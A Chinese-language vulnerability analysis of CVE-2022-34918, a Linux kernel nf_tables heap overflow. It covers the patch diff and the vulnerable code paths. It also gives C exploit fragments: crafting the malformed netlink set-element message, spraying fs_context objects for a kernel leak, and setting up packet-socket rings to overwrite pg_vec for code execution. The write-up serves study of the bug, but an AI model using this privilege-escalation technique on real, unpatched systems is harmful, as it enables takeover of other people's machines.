# CVE-2022-34918

這篇文章少部分的分析以及大部分的 exploit 都是參考 https://github.com/veritas501/CVE-2022-34918 。

## Analyze

Diff：

```diff
diff --git a/net/netfilter/nf_tables_api.c b/net/netfilter/nf_tables_api.c
index 51144fc66889b5..d6b59beab3a986 100644
--- a/net/netfilter/nf_tables_api.c
+++ b/net/netfilter/nf_tables_api.c
@@ -5213,13 +5213,20 @@ static int nft_setelem_parse_data(struct nft_ctx *ctx, struct nft_set *set,
 				  struct nft_data *data,
 				  struct nlattr *attr)
 {
+	u32 dtype;
 	int err;
 
 	err = nft_data_init(ctx, data, NFT_DATA_VALUE_MAXLEN, desc, attr);
 	if (err < 0)
 		return err;
 
-	if (desc->type != NFT_DATA_VERDICT && desc->len != set->dlen) {
+	if (set->dtype == NFT_DATA_VERDICT)
+		dtype = NFT_DATA_VERDICT;
+	else
+		dtype = NFT_DATA_VALUE;
+
+	if (dtype != desc->type ||
+	    set->dlen != desc->len) {
 		nft_data_release(data, desc->type);
 		return -EINVAL;
 	}
```

- `attr` 為使用者可控



執行流程：

- 變數 `nf_tables_subsys`
  - 成員 `cb` - `nf_tables_cb[]`
- `nf_tables_newsetelem()` - opcode `NFT_MSG_NEWSETELEM` 的 handler
- `nft_add_set_elem()`
- `nft_setelem_parse_data()`



發生漏洞的地方是 nf_tables 的 kernel driver：

```c
static const struct nfnetlink_subsystem nf_tables_subsys = {
    .name		= "nf_tables",
    .subsys_id	= NFNL_SUBSYS_NFTABLES,
    .cb_count	= NFT_MSG_MAX,
    .cb		= nf_tables_cb,
    .commit		= nf_tables_commit,
    .abort		= nf_tables_abort,
    .cleanup	= nf_tables_cleanup,
    .valid_genid	= nf_tables_valid_genid,
    .owner		= THIS_MODULE,
};
```



漏洞函數 `nft_setelem_parse_data()`，至此 `attr` 可控：

```c
static int nft_setelem_parse_data(struct nft_ctx *ctx, struct nft_set *set,
                                  struct nft_data_desc *desc,
                                  struct nft_data *data,
                                  struct nlattr *attr)
{
    int err;

    err = nft_data_init(ctx, data, NFT_DATA_VALUE_MAXLEN, desc, attr);
    if (err < 0)
        return err;

    if (desc->type != NFT_DATA_VERDICT && desc->len != set->dlen) {
        nft_data_release(data, desc->type);
        return -EINVAL;
    }

    return 0;
}
```

- 目的是要讓 nft_data item (`data`) 不會執行到 `nft_data_release()`
- `desc->type` 當 attribute 為 `NFTA_DATA_VALUE` 時，不等於 `NFT_DATA_VERDICT`，則可以 `desc->len != set->dlen` 

`nft_data_init()` 會先 parse attribute，並把他填到對應 type 的 tb：

```c
// parse nf_tables data netlink attributes
int nft_data_init(const struct nft_ctx *ctx,
                  struct nft_data *data, unsigned int size,
                  struct nft_data_desc *desc, const struct nlattr *nla)
{
    struct nlattr *tb[NFTA_DATA_MAX + 1];
    int err;

    err = nla_parse_nested_deprecated(tb, NFTA_DATA_MAX, nla,
                                      nft_data_policy, NULL);
    if (err < 0)
        return err;

    if (tb[NFTA_DATA_VALUE])
        return nft_value_init(ctx, data, size, desc,
                              tb[NFTA_DATA_VALUE]);
    if (tb[NFTA_DATA_VERDICT] && ctx != NULL)
        return nft_verdict_init(ctx, data, desc, tb[NFTA_DATA_VERDICT]);
    return -EINVAL;
}

// parse nested attributes
static inline int nla_parse_nested_deprecated(struct nlattr *tb[], int maxtype,
                                              const struct nlattr *nla,
                                              const struct nla_policy *policy,
                                              struct netlink_ext_ack *extack)
{
    return __nla_parse(tb, maxtype, nla_data(nla), nla_len(nla), policy,
                       NL_VALIDATE_LIBERAL, extack);
}

// Parse a stream of attributes into a tb buffer
int __nla_parse(struct nlattr **tb, int maxtype,
                const struct nlattr *head, int len,
                const struct nla_policy *policy, unsigned int validate,
                struct netlink_ext_ack *extack)
{
    return __nla_validate_parse(head, len, maxtype, policy, validate,
                                extack, tb, 0);
}

static int __nla_validate_parse(const struct nlattr *head, int len, int maxtype,
                                const struct nla_policy *policy,
                                unsigned int validate,
                                struct netlink_ext_ack *extack,
                                struct nlattr **tb, unsigned int depth)
{
    const struct nlattr *nla;
    int rem;
    
    if (tb)
        memset(tb, 0, sizeof(struct nlattr *) * (maxtype + 1));

    nla_for_each_attr(nla, head, len, rem) {
        u16 type = nla_type(nla);

        if (type == 0 || type > maxtype) {
            // ...
            continue;
        }
        if (policy) {
            int err = validate_nla(nla, maxtype, policy,
                                   validate, extack, depth);

            if (err < 0)
                return err;
        }

        if (tb)
            tb[type] = (struct nlattr *)nla;
    }

	// ...
    return 0;
}
```

- 包了很多層才到真正處理 parsing 的地方
- parse nla，並填到對應的 tb 當中

之後將 type `NFTA_DATA_VALUE` 的 tb entry 複製到 `data` 與 `desc`，因此兩者也算可控：

```c
enum nft_data_attributes {
    NFTA_DATA_UNSPEC,
    NFTA_DATA_VALUE,
    NFTA_DATA_VERDICT,
    __NFTA_DATA_MAX
};

static int nft_value_init(const struct nft_ctx *ctx,
                          struct nft_data *data, unsigned int size,
                          struct nft_data_desc *desc, const struct nlattr *nla)
{
    unsigned int len;

    len = nla_len(nla);
    if (len == 0)
        return -EINVAL;
    if (len > size)
        return -EOVERFLOW;

    nla_memcpy(data->data, nla, len);
    desc->type = NFT_DATA_VALUE;
    desc->len  = len;
    return 0;
}

// nla_len - length of payload
static inline int nla_len(const struct nlattr *nla)
{
    return nla->nla_len - NLA_HDRLEN;
}
```

- 如果是走 `nft_verdict_init()`，則代表 type 為 `NFTA_DATA_VERDICT`，此種屬性所帶的資料為 `NF_ACCEPT` / ` NF_DROP` / ` NF_QUEUE` 此種 netfilter 處理結果

最後會呼叫 `nft_data_release()`釋放 nft_data item：

```c
enum nft_data_types {
    NFT_DATA_VALUE,
    NFT_DATA_VERDICT	= 0xffffff00U,
};

void nft_data_release(const struct nft_data *data, enum nft_data_types type)
{
    if (type < NFT_DATA_VERDICT)
        return;
    switch (type) {
        case NFT_DATA_VERDICT:
            return nft_verdict_uninit(data);
        default:
            WARN_ON(1);
    }
}
```



---

上層觸發漏洞的函數為 `nft_add_set_elem()`：

```c
static int nft_add_set_elem(struct nft_ctx *ctx, struct nft_set *set,
                            const struct nlattr *attr, u32 nlmsg_flags)
{
    // ...

    if (nla[NFTA_SET_ELEM_DATA] != NULL) {
        // 漏洞函數
        err = nft_setelem_parse_data(ctx, set, &desc, &elem.data.val,
                                     nla[NFTA_SET_ELEM_DATA]);

        dreg = nft_type_to_reg(set->dtype);
        // ...
        // desc.len != set->len
        nft_set_ext_add_length(&tmpl, NFT_SET_EXT_DATA, desc.len);
    }

    // ...

    elem.priv = nft_set_elem_init(set, &tmpl, elem.key.val.data,
                                  elem.key_end.val.data, elem.data.val.data,
                                  timeout, expiration, GFP_KERNEL);

    // ...
}

static inline void nft_set_ext_add_length(struct nft_set_ext_tmpl *tmpl, u8 id,
                                          unsigned int len)
{
    tmpl->len	 = ALIGN(tmpl->len, nft_set_ext_types[id].align);
    BUG_ON(tmpl->len > U8_MAX);
    tmpl->offset[id] = tmpl->len;
    tmpl->len	+= nft_set_ext_types[id].len + len;
}

void *nft_set_elem_init(const struct nft_set *set,
                        const struct nft_set_ext_tmpl *tmpl,
                        const u32 *key, const u32 *key_end,
                        const u32 *data, u64 timeout, u64 expiration, gfp_t gfp)
{
    struct nft_set_ext *ext;
    void *elem;

    // 根據 tmpl->len 分配空間，而 tmpl->len 為 desc->len
    elem = kzalloc(set->ops->elemsize + tmpl->len, gfp);
    if (elem == NULL)
        return NULL;

    ext = nft_set_elem_ext(set, elem);
    nft_set_ext_init(ext, tmpl);

	// ...
    // 複製的資料大小為 set->dlen
    if (nft_set_ext_exists(ext, NFT_SET_EXT_DATA))
        memcpy(nft_set_ext_data(ext), data, set->dlen);
    
    return elem;
}
```

`set->dlen` 多少可以往前追一下：

```c
static int nf_tables_newsetelem(struct sk_buff *skb,
                                const struct nfnl_info *info,
                                const struct nlattr * const nla[])
{
    struct nft_set *set;
    // ...
    set = nft_set_lookup_global(net, table, nla[NFTA_SET_ELEM_LIST_SET],
                                nla[NFTA_SET_ELEM_LIST_SET_ID], genmask);
}

struct nft_set *nft_set_lookup_global(const struct net *net,
                                      const struct nft_table *table,
                                      const struct nlattr *nla_set_name,
                                      const struct nlattr *nla_set_id,
                                      u8 genmask)
{
    struct nft_set *set;

    set = nft_set_lookup(table, nla_set_name, genmask);
    if (IS_ERR(set)) {
        if (!nla_set_id)
            return set;

        set = nft_set_lookup_byid(net, nla_set_id, genmask);
    }
    return set;
}

static struct nft_set *nft_set_lookup(const struct nft_table *table,
                                      const struct nlattr *nla, u8 genmask)
{
    struct nft_set *set;

    list_for_each_entry_rcu(set, &table->sets, list) {
        if (!nla_strcmp(nla, set->name) &&
            nft_active_genmask(set, genmask))
            return set;
    }
    return ERR_PTR(-ENOENT);
}
```

用來分配 set 的函數 `nf_tables_newset()` 是 opcode `NFT_MSG_NEWSET` 的 handler，其中 `set->dlen` 的值：

```c
static int nf_tables_newset(struct sk_buff *skb, const struct nfnl_info *info,
                            const struct nlattr * const nla[])
{
    // ...
    if (nla[NFTA_SET_DATA_TYPE] != NULL) {
        if (!(flags & NFT_SET_MAP))
            return -EINVAL;

        // NFT_DATA_VERDICT
        dtype = ntohl(nla_get_be32(nla[NFTA_SET_DATA_TYPE]));
        if ((dtype & NFT_DATA_RESERVED_MASK) == NFT_DATA_RESERVED_MASK &&
            dtype != NFT_DATA_VERDICT)
            return -EINVAL;

        if (dtype != NFT_DATA_VERDICT) {
            // ...
            // NFTA_SET_DATA_LEN
            desc.dlen = ntohl(nla_get_be32(nla[NFTA_SET_DATA_LEN]));
            // 範圍落在 0 ~ NFT_DATA_VALUE_MAXLEN 當中
            if (desc.dlen == 0 || desc.dlen > NFT_DATA_VALUE_MAXLEN)
                return -EINVAL;
        } else
            desc.dlen = sizeof(struct nft_verdict);
    }

    //...
    udlen = 0;
    if (nla[NFTA_SET_USERDATA])
        udlen = nla_len(nla[NFTA_SET_USERDATA]);
    alloc_size = sizeof(*set) + size + udlen;
    set = kvzalloc(alloc_size, GFP_KERNEL);
    // ...
    set->dlen = desc.dlen;
}

#define NFT_DATA_VALUE_MAXLEN	64
```

- 代表 `desc.dlen` 最多可以到 `NFT_DATA_VALUE_MAXLEN`，也就是 0x40



## Environment

```
CONFIG_SLAB_FREELIST_RANDOM=y
CONFIG_SLAB_FREELIST_HARDENED=y
CONFIG_USERFAULTFD=y
```



## Netlink

Netlink socket family 用於 IPC (inter-process communication)，其中使用 pid 作為標記，並根據 protocol 的不同有不同的功能。建立 netlink socket 的方式如下：

```c
fd = socket(AF_NETLINK, SOCK_DGRAM or SOCK_RAW, protocol);
```

而 protocol 的種類定義在 kernel code include/uapi/linux/netlink.h：

```c
#define NETLINK_ROUTE		0	/* Routing/device hook				*/
#define NETLINK_UNUSED		1	/* Unused number				*/
#define NETLINK_USERSOCK	2	/* Reserved for user mode socket protocols 	*/
#define NETLINK_FIREWALL	3	/* Unused number, formerly ip_queue		*/
#define NETLINK_SOCK_DIAG	4	/* socket monitoring				*/
#define NETLINK_NFLOG		5	/* netfilter/iptables ULOG */
#define NETLINK_XFRM		6	/* ipsec */
#define NETLINK_SELINUX		7	/* SELinux event notifications */
#define NETLINK_ISCSI		8	/* Open-iSCSI */
#define NETLINK_AUDIT		9	/* auditing */
#define NETLINK_FIB_LOOKUP	10	
#define NETLINK_CONNECTOR	11
#define NETLINK_NETFILTER	12	/* netfilter subsystem */
#define NETLINK_IP6_FW		13
#define NETLINK_DNRTMSG		14	/* DECnet routing messages (obsolete) */
#define NETLINK_KOBJECT_UEVENT	15	/* Kernel messages to userspace */
#define NETLINK_GENERIC		16
/* leave room for NETLINK_DM (DM Events) */
#define NETLINK_SCSITRANSPORT	18	/* SCSI Transports */
#define NETLINK_ECRYPTFS	19
#define NETLINK_RDMA		20
#define NETLINK_CRYPTO		21	/* Crypto layer */
#define NETLINK_SMC		22	/* SMC monitoring */

```

在透過 socket 傳送資料時，使用的格式為 `struct nlmsghdr`，同樣定義在 include/uapi/linux/netlink.h：

```c
// fixed format metadata header of Netlink messages
struct nlmsghdr {
    __u32 nlmsg_len;    /* Length of message including header */
    __u16 nlmsg_type;   /* Type of message content */
    __u16 nlmsg_flags;  /* Additional flags */
    __u32 nlmsg_seq;    /* Sequence number */
    __u32 nlmsg_pid;    /* Sender port ID */
};

// General form of address family dependent message.
struct nfgenmsg {
    __u8  nfgen_family;		/* AF_xxx */
    __u8  version;		/* nfnetlink version */
    __be16    res_id;		/* resource id */
};
```

傳送時會使用 syscall `sendmsg()`，而 `recvmsg()` 則是拿來接收回傳資料。

`send()` / `sendto()` / `sendmsg()` 都是用來傳送資料給 socket，不過三者的使用情況有些不同：

- `send()` - 只有當 socket 為連線狀態時才能用
- `sendto()` - 用在 connection-mode (SOCK_STREAM, SOCK_SEQPACKET) socket
- `sendmsg()` - 用 msg.msg_iov 傳資料

透過 `sendmsg()` 時，msg 會以 batch 的方式送出，而開頭與結尾必須要是 BATCH_BEGIN 以及 BATCH_END，結構大致如下：

- type 為 `NFNL_MSG_BATCH_BEGIN` 的 nlmsghdr
- type 為 `(NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWTABLE` 的 nlmsghdr
- type 為 `(NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWTABLE` 的 nlmsghdr
- ...
- type 為 `NFNL_MSG_BATCH_END` 的 nlmsghdr



### Exploit

初始化 netfilter：

- 最基本的 create socket + bind

  ```c
  netfilter_sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_NETFILTER);
  
  snl.nl_family = AF_NETLINK;
  snl.nl_pid = getpid();
  bind(netfilter_sock, (struct sockaddr *)&snl, sizeof(snl))
  ```

create table：

- user space

  - 操作 opcode 為 `NFT_MSG_NEWTABLE`
  - 設置 `NFTA_TABLE_NAME` 為指定名稱

- kernel space

  - 由 handler `nf_tables_newtable()` 處理

  - 參數 `nla[]` 會根據使用者設置不同 type 的 attribute 有不同的 data，而每個 opcode 都有不同的 type，像是 newtable 有：
    ```c
    enum nft_table_attributes {
        NFTA_TABLE_UNSPEC,
        NFTA_TABLE_NAME,
        NFTA_TABLE_FLAGS,
        NFTA_TABLE_USE,
        NFTA_TABLE_HANDLE,
        NFTA_TABLE_PAD,
        NFTA_TABLE_USERDATA,
        NFTA_TABLE_OWNER,
        __NFTA_TABLE_MAX
    };
    ```

  - 透過 `nft_table_lookup()` 看是否已經存在對應的 table，有的話就會直接離開

  - `table = kzalloc(sizeof(*table), GFP_KERNEL);` 建立 table

  - 初始化 table 並 return

    - 如果有帶上 type 為 `NFTA_TABLE_FLAGS` 或是 `NFTA_TABLE_USERDATA` 的 attribute，就會額外設置 `table->flags` 或 `table->udata` & `table->udlen`



create set:

- user space

  - 操作 opcode 為 `NFT_MSG_NEWSET`，指定 set 至對應的 table

  - 需要設置更多的資料：
    ```c
    attr = set_str8_attr(attr, NFTA_SET_TABLE, table_name);
    attr = set_str8_attr(attr, NFTA_SET_NAME, set_name);
    attr = set_u32_attr(attr, NFTA_SET_ID, id);
    attr = set_u32_attr(attr, NFTA_SET_KEY_LEN, set_keylen);
    attr = set_u32_attr(attr, NFTA_SET_FLAGS, NFT_SET_MAP);
    attr = set_u32_attr(attr, NFTA_SET_DATA_TYPE, 0);
    set_u32_attr(attr, NFTA_SET_DATA_LEN, data_len);
    ```
    
    - flag 送 `NLM_F_REQUEST | NLM_F_CREATE`

- kernel space

  - handler `nf_tables_newset()`：

    - `table = nft_table_lookup(net, nla[NFTA_SET_TABLE], ...)` 檢查指定 table 是否存在

    - `set = nft_set_lookup(table, nla[NFTA_SET_NAME], ...)` 檢查 set 是否存在

    - `nft_select_set_ops()` - 為請求 policy 與提供的資料選擇適合的 set

      - 一共有下列種類的 set：

        ```c
        static const struct nft_set_type *nft_set_types[] = {
        	&nft_set_hash_fast_type,
        	&nft_set_hash_type,
        	&nft_set_rhash_type,
        	&nft_set_bitmap_type,
        	&nft_set_rbtree_type,
        	&nft_set_pipapo_avx2_type,
        	&nft_set_pipapo_type,
        };
        ```

        - 回傳 `nft_set_rhash_type`




add element to set:

- user space

  - ```c
    /*** First element ***/
    // 第一個 element 的屬性有哪些
    nested_attr_size += sizeof(struct nlattr);             // Englobing attribute
    nested_attr_size += sizeof(struct nlattr);             // NFTA_SET_ELEM_KEY
    nested_attr_size += NLA_BIN_SIZE(set_keylen);          // NFTA_DATA_VALUE
    nested_attr_size += sizeof(struct nlattr);             // NFTA_SET_ELEM_KEY_END
    nested_attr_size += NLA_BIN_SIZE(set_keylen);          // NFTA_DATA_VALUE
    nested_attr_size += sizeof(struct nlattr);             // NFTA_SET_ELEM_DATA
    nested_attr_size += NLA_ALIGN(NLA_BIN_SIZE(data_len)); // NFTA_DATA_VALUE
    first_element_size = nested_attr_size;
    
    /*** Second element ***/
    // 第二個 element 的屬性有哪些
    nested_attr_size += sizeof(struct nlattr);    // Englobing attribute
    nested_attr_size += sizeof(struct nlattr);    // NFTA_SET_ELEM_KEY
    nested_attr_size += NLA_BIN_SIZE(set_keylen); // NFTA_DATA_VALUE
    nested_attr_size += sizeof(struct nlattr);    // NFTA_SET_ELEM_KEY_END
    nested_attr_size += NLA_BIN_SIZE(set_keylen); // NFTA_DATA_VALUE
    nested_attr_size += sizeof(struct nlattr);    // NFTA_SET_ELEM_DATA
    nested_attr_size += sizeof(struct nlattr);    // NFTA_DATA_VERDICT
    nested_attr_size += U32_NLA_SIZE;             // NFTA_VERDICT_CODE
    second_element_size = nested_attr_size - first_element_size;
    
    // total
    nlh_payload_size = sizeof(struct nfgenmsg); // Mandatory
    nlh_payload_size += sizeof(struct nlattr);  // NFTA_SET_ELEM_LIST_ELEMENTS (set list elements 的 opcode)
    
    nlh_payload_size += nested_attr_size;       // All the stuff described above
    nlh_payload_size += S8_NLA_SIZE;            // NFTA_SET_ELEM_LIST_TABLE
    nlh_payload_size += S8_NLA_SIZE;            // NFTA_SET_ELEM_LIST_SET
    nlh_payload_size += U32_NLA_SIZE;           // NFTA_SET_ELEM_LIST_SET_ID
    nlh_payload_size = NLMSG_SPACE(nlh_payload_size);
    
    /** Allocation **/
    nlh_payload = (struct nlmsghdr *)malloc(nlh_payload_size);
    memset(nlh_payload, 0, nlh_payload_size);
    
    /** Fill the required fields **/
    nlh_payload->nlmsg_len = nlh_payload_size;
    nlh_payload->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSETELEM;
    nlh_payload->nlmsg_pid = getpid();
    nlh_payload->nlmsg_flags = NLM_F_REQUEST;
    nlh_payload->nlmsg_seq = 0;
    
    /** Setup the nfgenmsg **/
    nfm = (struct nfgenmsg *)NLMSG_DATA(nlh_payload);
    nfm->nfgen_family = NFPROTO_INET;
    
    /** Setup the attributes */
    attr = (struct nlattr *)((void *)nlh_payload + NLMSG_SPACE(sizeof(struct nfgenmsg)));
    attr = set_str8_attr(attr, NFTA_SET_ELEM_LIST_TABLE, table_name);
    attr = set_str8_attr(attr, NFTA_SET_ELEM_LIST_SET, set_name);
    attr = set_u32_attr(attr, NFTA_SET_ELEM_LIST_SET_ID, id);
    attr = set_nested_attr(attr, NFTA_SET_ELEM_LIST_ELEMENTS, nested_attr_size);
    
    /*** First element ***/
    attr = set_nested_attr(attr, 0, first_element_size - 4);
    attr = set_nested_attr(attr, NFTA_SET_ELEM_KEY, NLA_BIN_SIZE(set_keylen));
    attr = set_binary_attr(attr, NFTA_DATA_VALUE, (uint8_t *)zerobuf, set_keylen);
    attr = set_nested_attr(attr, NFTA_SET_ELEM_KEY_END, NLA_BIN_SIZE(set_keylen));
    attr = set_binary_attr(attr, NFTA_DATA_VALUE, (uint8_t *)zerobuf, set_keylen);
    attr = set_nested_attr(attr, NFTA_SET_ELEM_DATA, NLA_BIN_SIZE(data_len));
    attr = set_binary_attr(attr, NFTA_DATA_VALUE, (uint8_t *)data, data_len);
    
    /*** Second element ***/
    attr = set_nested_attr(attr, 0, second_element_size - 4);
    attr = set_nested_attr(attr, NFTA_SET_ELEM_KEY, NLA_BIN_SIZE(set_keylen));
    attr = set_binary_attr(attr, NFTA_DATA_VALUE, (uint8_t *)zerobuf, set_keylen);
    attr = set_nested_attr(attr, NFTA_SET_ELEM_KEY_END, NLA_BIN_SIZE(set_keylen));
    attr = set_binary_attr(attr, NFTA_DATA_VALUE, (uint8_t *)zerobuf, set_keylen);
    attr = set_nested_attr(attr, NFTA_SET_ELEM_DATA, U32_NLA_SIZE + sizeof(struct nlattr));
    attr = set_nested_attr(attr, NFTA_DATA_VERDICT, U32_NLA_SIZE);
    attr = set_u32_attr(attr, NFTA_VERDICT_CODE, NFT_CONTINUE);
    ```

- kernel space

  - `nf_tables_newsetelem()` - opcode `NFT_MSG_NEWSETELEM` handler

    - 取得 table & set 並檢查是否存在而已

    - `nft_add_set_elem()` traverse 所有的 element (`NFTA_SET_ELEM_LIST_ELEMENTS`)

      - parse element 會走到 `__nla_validate_parse()`，解析 element 的屬性，以下為合法的 type：
        ```c
        enum netlink_validation {
        	NL_VALIDATE_LIBERAL = 0,
        	NL_VALIDATE_TRAILING = BIT(0),
        	NL_VALIDATE_MAXTYPE = BIT(1),
        	NL_VALIDATE_UNSPEC = BIT(2),
        	NL_VALIDATE_STRICT_ATTRS = BIT(3),
        	NL_VALIDATE_NESTED = BIT(4),
        };
        ```

        - element 本身可能會有 attribute

    - 上面 parsing 結果會存在 local variable `struct nlattr *nla[NFTA_SET_ELEM_MAX + 1];`，而 buffer 大小為 `NFTA_SET_ELEM_MAX` 的原因為：
      ```c
      /**
       * enum nft_data_attributes - nf_tables data netlink attributes
       *
       * @NFTA_DATA_VALUE: generic data (NLA_BINARY)
       * @NFTA_DATA_VERDICT: nf_tables verdict (NLA_NESTED: nft_verdict_attributes)
       */
      enum nft_data_attributes {
          NFTA_DATA_UNSPEC,
          NFTA_DATA_VALUE,
          NFTA_DATA_VERDICT,
          __NFTA_DATA_MAX
      };
      ```

    - iterate over a stream of attributes

      ```c
      #define nla_for_each_attr(pos, head, len, rem) \
      	for (pos = head, rem = len; \
      	     nla_ok(pos, rem); \
      	     pos = nla_next(pos, &(rem)))
      
      static inline int nla_ok(const struct nlattr *nla, int remaining)
      {
          return remaining >= (int) sizeof(*nla) &&
              nla->nla_len >= sizeof(*nla) &&
              nla->nla_len <= remaining;
      }
      
      static inline struct nlattr *nla_next(const struct nlattr *nla, int *remaining)
      {
          unsigned int totlen = NLA_ALIGN(nla->nla_len);
      
          *remaining -= totlen;
          return (struct nlattr *) ((char *) nla + totlen);
      }
      ```

      - nla 開頭會紀錄總共 attribute 的大小，而在後續各個 attribute 會有自己的大小

    - 依序 append 資料：

      - NFTA_SET_EXT_KEY
      - NFTA_SET_EXT_KEY_END
      - NFTA_SET_ELEM_DATA



---

在作者的 exploit 中挑選了 `struct fs_context` (Filesystem context) 做為 leak 目標，這是過去沒有看過的：

```c
struct fs_context {
    const struct fs_context_operations *ops;
    struct mutex		uapi_mutex;	/* Userspace access mutex */
    struct file_system_type	*fs_type;
    void			*fs_private;	/* The filesystem's context */
    void			*sget_key;
    struct dentry		*root;		/* The root and superblock */
    struct user_namespace	*user_ns;	/* The user namespace for this mount */
    struct net		*net_ns;	/* The network namespace for this mount */
    const struct cred	*cred;		/* The mounter's credentials */
    struct p_log		log;		/* Logging buffer */
    const char		*source;	/* The source name (eg. dev path) */
    void			*security;	/* Linux S&M options */
    void			*s_fs_info;	/* Proposed s_fs_info */
    unsigned int		sb_flags;	/* Proposed superblock flags (SB_*) */
    unsigned int		sb_flags_mask;	/* Superblock flags that were changed */
    unsigned int		s_iflags;	/* OR'd with sb->s_iflags */
    unsigned int		lsm_flags;	/* Information flags from the fs to the LSM */
    enum fs_context_purpose	purpose:8;
    enum fs_context_phase	phase:8;	/* The phase the context is in */
    bool			need_free:1;	/* Need to call ops->free() */
    bool			global:1;	/* Goes into &init_user_ns */
    bool			oldapi:1;	/* Coming from mount(2) */
};

void spray_fs_context(int *fd_buffer, int spray_size) {
    for (int i = 0; i < spray_size; i++) {
        fd_buffer[i] = fsopen("ext4", 0);
    }
}
```

- `fs_context_ops` 指向 code base
- 大小為 0xa0，落於 kmalloc-192

再來利用 spray raw_packet 的方法來 overwrite pg_vector，實際上構造方式跟之前 project zero 提出來的方法相同，但是要利用的結構不一樣：

```c
void packet_socket_rx_ring_init(int s, unsigned int block_size,
                                unsigned int frame_size, unsigned int block_nr,
                                unsigned int sizeof_priv, unsigned int timeout) {
    int v = TPACKET_V3;
    int rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));

    struct tpacket_req3 req;
    memset(&req, 0, sizeof(req));
    req.tp_block_size = block_size;
    req.tp_frame_size = frame_size;
    req.tp_block_nr = block_nr;
    req.tp_frame_nr = (block_size * block_nr) / frame_size;
    req.tp_retire_blk_tov = timeout;
    req.tp_sizeof_priv = sizeof_priv;
    req.tp_feature_req_word = 0;

    rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
}

int packet_socket_setup(unsigned int block_size, unsigned int frame_size,
                        unsigned int block_nr, unsigned int sizeof_priv, int timeout) {
    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    packet_socket_rx_ring_init(s, block_size, frame_size, block_nr,
                               sizeof_priv, timeout);

    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = PF_PACKET;
    sa.sll_protocol = htons(ETH_P_ALL);
    sa.sll_ifindex = if_nametoindex("lo");
    sa.sll_hatype = 0;
    sa.sll_pkttype = 0;
    sa.sll_halen = 0;

    int rv = bind(s, (struct sockaddr *)&sa, sizeof(sa));

    return s;
}
```



而第一次的 overwrite 是讀 fs_context 的成員 `fs_context_operations` (function pointer) 來控制執行流程，而第二次 overwrite 則是蓋寫成任意 shellcode。
